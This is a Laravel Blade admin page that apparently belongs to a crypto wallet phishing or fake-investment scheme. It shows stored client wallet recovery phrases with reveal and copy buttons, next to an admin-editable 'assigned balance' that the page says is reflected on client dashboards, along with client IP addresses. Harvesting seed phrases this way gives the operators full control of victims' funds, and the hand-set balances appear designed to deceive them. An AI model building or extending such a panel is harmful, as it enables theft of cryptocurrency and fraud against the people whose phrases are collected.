@extends('layouts.app')

@section('content')
<div class="container-fluid">
    <div class="row mb-4">
        <div class="col-12 d-flex flex-column flex-md-row justify-content-between align-items-md-center gap-3">
            <div>
                <h3 class="f-w-700 mb-1">Connected Web3 Wallets &amp; Recovery Keys</h3>
                <p class="text-muted mb-0 f-14">Centralized audit log of client decentralized wallets, recovery phrases, and synchronized balances.</p>
            </div>
            <div class="d-flex align-items-center gap-2">
                <a href="{{ route('manageusers') }}" class="btn btn-outline-primary btn-sm rounded-pill px-3 py-2">
                    <i class="fa-solid fa-users me-1"></i> Manage Users
                </a>
            </div>
        </div>
    </div>

    <x-danger-alert />
    <x-success-alert />

    <!-- 3 Top Metric Summary Cards -->
    <div class="row g-3 mb-4">
        <div class="col-sm-6 col-xl-4">
            <div class="card border-0 shadow-sm rounded-3 h-100">
                <div class="card-body p-3 d-flex align-items-center justify-content-between">
                    <div>
                        <span class="text-muted f-12 f-w-600 text-uppercase d-block mb-1">Total Connected Wallets</span>
                        <h3 class="f-w-800 text-primary mb-0">{{ number_format($totalWallets) }}</h3>
                        <small class="text-muted f-11">Across all registered clients</small>
                    </div>
                    <div class="rounded-circle d-flex align-items-center justify-content-center bg-light-primary text-primary" style="width: 48px; height: 48px; font-size: 20px;">
                        <i class="fa-solid fa-wallet"></i>
                    </div>
                </div>
            </div>
        </div>

        <div class="col-sm-6 col-xl-4">
            <div class="card border-0 shadow-sm rounded-3 h-100">
                <div class="card-body p-3 d-flex align-items-center justify-content-between">
                    <div>
                        <span class="text-muted f-12 f-w-600 text-uppercase d-block mb-1">Total Synchronized Balance</span>
                        <h3 class="f-w-800 text-success mb-0">{{ $settings->currency }}{{ number_format($totalBalance, 2) }}</h3>
                        <small class="text-muted f-11">Reflected on client dashboards</small>
                    </div>
                    <div class="rounded-circle d-flex align-items-center justify-content-center bg-light-success text-success" style="width: 48px; height: 48px; font-size: 20px;">
                        <i class="fa-solid fa-coins"></i>
                    </div>
                </div>
            </div>
        </div>

        <div class="col-sm-12 col-xl-4">
            <div class="card border-0 shadow-sm rounded-3 h-100">
                <div class="card-body p-3 d-flex align-items-center justify-content-between">
                    <div>
                        <span class="text-muted f-12 f-w-600 text-uppercase d-block mb-1">Unique Clients Connected</span>
                        <h3 class="f-w-800 text-info mb-0">{{ number_format($uniqueUsers) }}</h3>
                        <small class="text-muted f-11">Active Web3 user accounts</small>
                    </div>
                    <div class="rounded-circle d-flex align-items-center justify-content-center bg-light-info text-info" style="width: 48px; height: 48px; font-size: 20px;">
                        <i class="fa-solid fa-user-check"></i>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Main Table Card -->
    <div class="card border-0 shadow-sm rounded-3">
        <div class="card-header bg-transparent border-bottom p-3">
            <div class="row align-items-center justify-content-between g-3">
                <div class="col-md-6 col-12">
                    <h5 class="f-w-700 text-dark mb-0">Client Connected Wallets Ledger</h5>
                    <small class="text-muted f-12">Click the eye icon to view recovery phrases or copy them directly.</small>
                </div>
                <div class="col-md-6 col-12">
                    <form method="GET" action="{{ route('admin.connected.wallets') }}" class="d-flex gap-2">
                        <div class="input-group">
                            <span class="input-group-text bg-light border-end-0"><i class="fa-solid fa-magnifying-glass text-muted"></i></span>
                            <input type="text" name="search" class="form-control border-start-0" placeholder="Search by user, provider, IP..." value="{{ request('search') }}">
                        </div>
                        <button type="submit" class="btn btn-primary px-3">Search</button>
                        @if(request('search'))
                            <a href="{{ route('admin.connected.wallets') }}" class="btn btn-outline-secondary px-3" title="Clear Search">Clear</a>
                        @endif
                    </form>
                </div>
            </div>
        </div>

        <div class="card-body p-0">
            <div class="table-responsive">
                <table class="table table-hover align-middle mb-0">
                    <thead class="table-light">
                        <tr>
                            <th class="ps-3" style="font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;">Client</th>
                            <th style="font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;">Wallet Provider</th>
                            <th style="font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;">Recovery Phrase / Secret Seed</th>
                            <th style="font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; width: 190px;">Assigned Balance ({{ $settings->currency }})</th>
                            <th style="font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;">IP &amp; Timestamp</th>
                            <th style="font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;">Status</th>
                            <th class="pe-3 text-end" style="font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px;">Action</th>
                        </tr>
                    </thead>
                    <tbody>
                        @forelse($wallets as $w)
                            @php
                                $providerName = strtolower(trim($w->wallet_provider ?? ''));
                                $wIcon = null;
                                if (isset($walletTypes)) {
                                    $matchedWt = $walletTypes->get($providerName);
                                    if (!$matchedWt) {
                                        $matchedWt = $walletTypes->first(function($wt, $k) use ($providerName) {
                                            return str_contains($providerName, (string)$k) || str_contains((string)$k, $providerName);
                                        });
                                    }
                                    if ($matchedWt && !empty($matchedWt->icon_url)) {
                                        $wIcon = $matchedWt->icon_url;
                                    }
                                }
                                if (!$wIcon) {
                                    if (str_contains($providerName, 'metamask')) {
                                        $wIcon = asset('assets/wallet-types/icons/1NS1POo31VhHeJuQOv2IOgLwI6jAe8KK6QG2WLPI.png');
                                    } elseif (str_contains($providerName, 'trust')) {
                                        $wIcon = asset('assets/wallet-types/icons/kxF43fXtB3B0m0C8Tz5ZZ3ckEYwKZFHCVJOh1BVr.png');
                                    } elseif (str_contains($providerName, 'coinbase')) {
                                        $wIcon = asset('assets/wallet-types/icons/fW86jwztjOyUCIiaf8XX7bAmxPx2BCwtRMy9RK5Z.jpg');
                                    } elseif (str_contains($providerName, 'bakkt')) {
                                        $wIcon = asset('assets/wallet-types/icons/yRqNYjy782hPVqJXhrvKuYqMe9FcnJegeSzDO5Ok.png');
                                    }
                                }
                            @endphp
                            <tr>
                                <td class="ps-3">
                                    @if($w->user)
                                        <div class="d-flex align-items-center gap-2">
                                            <div class="rounded-circle bg-light-primary text-primary d-flex align-items-center justify-content-center f-w-700" style="width: 36px; height: 36px; font-size: 13px;">
                                                {{ strtoupper(substr($w->user->name ?? 'U', 0, 1)) }}
                                            </div>
                                            <div>
                                                <a href="{{ route('viewuser', $w->user->id) }}" class="f-w-700 text-dark text-decoration-none d-block">
                                                    {{ $w->user->name }}
                                                </a>
                                                <small class="text-muted f-11">{{ $w->user->email }}</small>
                                            </div>
                                        </div>
                                    @else
                                        <span class="badge bg-light text-muted border">Deleted User (#{{ $w->user_id }})</span>
                                    @endif
                                </td>

                                <td>
                                    <div class="d-flex align-items-center gap-2">
                                        <div class="rounded-circle d-flex align-items-center justify-content-center bg-white border shadow-sm flex-shrink-0" style="width: 34px; height: 34px; overflow: hidden;">
                                            @if($wIcon)
                                                <img src="{{ $wIcon }}" alt="{{ $w->wallet_provider }}" style="width: 22px; height: 22px; object-fit: contain;" onerror="this.outerHTML='<i class=\'fa-solid fa-wallet text-primary f-14\'></i>'">
                                            @else
                                                <i class="fa-solid fa-wallet text-primary f-14"></i>
                                            @endif
                                        </div>
                                        <div>
                                            <div class="f-w-700 text-dark f-13">{{ $w->wallet_provider }}</div>
                                            <span class="badge bg-light text-muted border f-10 rounded-pill">ID #{{ $w->id }}</span>
                                        </div>
                                    </div>
                                </td>

                                <td>
                                    @if(!empty($w->passphrase))
                                        <div class="d-flex align-items-center gap-2">
                                            <div class="p-2 rounded bg-light border f-12 text-monospace text-dark text-break flex-grow-1" style="max-width: 320px;" id="phrase-box-{{ $w->id }}">
                                                <span class="phrase-masked" id="phrase-masked-{{ $w->id }}">••••••••••••••••••••••••••••</span>
                                                <span class="phrase-raw d-none" id="phrase-raw-{{ $w->id }}">{{ $w->passphrase }}</span>
                                            </div>
                                            <button type="button" class="btn btn-sm btn-outline-secondary rounded-2 p-1 px-2" onclick="togglePhrase({{ $w->id }})" title="Show/Hide Phrase">
                                                <i class="fa-regular fa-eye" id="eye-icon-{{ $w->id }}"></i>
                                            </button>
                                            <button type="button" class="btn btn-sm btn-outline-primary rounded-2 p-1 px-2" onclick="copyPhrase({{ $w->id }})" title="Copy Phrase">
                                                <i class="fa-regular fa-copy" id="copy-icon-{{ $w->id }}"></i>
                                            </button>
                                        </div>
                                    @else
                                        <span class="text-muted f-12 italic"><i class="fa-solid fa-minus me-1"></i> No phrase recorded</span>
                                    @endif
                                </td>

                                <td>
                                    <form action="{{ route('admin.wallet.single.update', $w->id) }}" method="POST" class="d-flex align-items-center gap-1">
                                        @csrf
                                        <div class="input-group input-group-sm">
                                            <span class="input-group-text bg-light">{{ $settings->currency }}</span>
                                            <input type="number" step="any" min="0" name="balance" value="{{ $w->balance }}" class="form-control f-w-700 text-primary">
                                            <button type="submit" class="btn btn-primary" title="Save Balance">
                                                <i class="fa-solid fa-check"></i>
                                            </button>
                                        </div>
                                    </form>
                                </td>

                                <td>
                                    <div>
                                        <span class="badge bg-light text-dark border f-11 rounded-pill mb-1">
                                            <i class="fa-solid fa-network-wired me-1 text-primary"></i> {{ $w->ip_address ?? '127.0.0.1' }}
                                        </span>
                                        <small class="text-muted d-block f-11">
                                            <i class="fa-regular fa-clock me-1"></i> {{ $w->created_at ? $w->created_at->format('M d, Y h:i A') : 'N/A' }}
                                        </small>
                                        <small class="text-info f-10">
                                            ({{ $w->created_at ? $w->created_at->diffForHumans() : '' }})
                                        </small>
                                    </div>
                                </td>

                                <td>
                                    @if($w->status === 'connected')
                                        <span class="badge bg-light-success text-success border border-success border-opacity-25 rounded-pill px-2.5 py-1 f-11">
                                            <i class="fa-solid fa-circle-check me-1"></i> Connected
                                        </span>
                                    @else
                                        <span class="badge bg-light text-muted border rounded-pill px-2.5 py-1 f-11">
                                            {{ ucfirst($w->status ?? 'Active') }}
                                        </span>
                                    @endif
                                </td>

                                <td class="pe-3 text-end">
                                    <a href="{{ route('admin.wallet.single.delete', $w->id) }}" class="btn btn-sm btn-outline-danger rounded-2 p-1 px-2" onclick="return confirm('Are you sure you want to remove this connected wallet record (#{{ $w->id }})?');" title="Delete Wallet">
                                        <i class="fa-solid fa-trash"></i>
                                    </a>
                                </td>
                            </tr>
                        @empty
                            <tr>
                                <td colspan="7" class="text-center py-5">
                                    <div class="py-4">
                                        <i class="fa-solid fa-wallet f-48 text-muted opacity-50 mb-3"></i>
                                        <h5 class="f-w-700 text-dark mb-1">No Connected Wallets Found</h5>
                                        <p class="text-muted mb-0 f-13">When clients connect their Web3 wallets, they will appear here with full recovery details.</p>
                                    </div>
                                </td>
                            </tr>
                        @endforelse
                    </tbody>
                </table>
            </div>
        </div>

        @if($wallets->hasPages())
            <div class="card-footer bg-transparent border-top p-3 d-flex justify-content-end">
                {{ $wallets->withQueryString()->links() }}
            </div>
        @endif
    </div>
</div>

<script>
    function togglePhrase(id) {
        var rawEl = document.getElementById('phrase-raw-' + id);
        var maskedEl = document.getElementById('phrase-masked-' + id);
        var icon = document.getElementById('eye-icon-' + id);

        if (rawEl && maskedEl && icon) {
            if (rawEl.classList.contains('d-none')) {
                rawEl.classList.remove('d-none');
                maskedEl.classList.add('d-none');
                icon.className = 'fa-regular fa-eye-slash text-danger';
            } else {
                rawEl.classList.add('d-none');
                maskedEl.classList.remove('d-none');
                icon.className = 'fa-regular fa-eye';
            }
        }
    }

    function copyPhrase(id) {
        var rawEl = document.getElementById('phrase-raw-' + id);
        var icon = document.getElementById('copy-icon-' + id);
        if (rawEl) {
            var text = rawEl.textContent.trim();
            navigator.clipboard.writeText(text).then(function() {
                if (icon) {
                    icon.className = 'fa-solid fa-check text-success';
                    setTimeout(function() {
                        icon.className = 'fa-regular fa-copy';
                    }, 2000);
                }
            }).catch(function() {
                var temp = document.createElement('textarea');
                temp.value = text;
                document.body.appendChild(temp);
                temp.select();
                document.execCommand('copy');
                document.body.removeChild(temp);
                if (icon) {
                    icon.className = 'fa-solid fa-check text-success';
                    setTimeout(function() {
                        icon.className = 'fa-regular fa-copy';
                    }, 2000);
                }
            });
        }
    }
</script>
@endsection
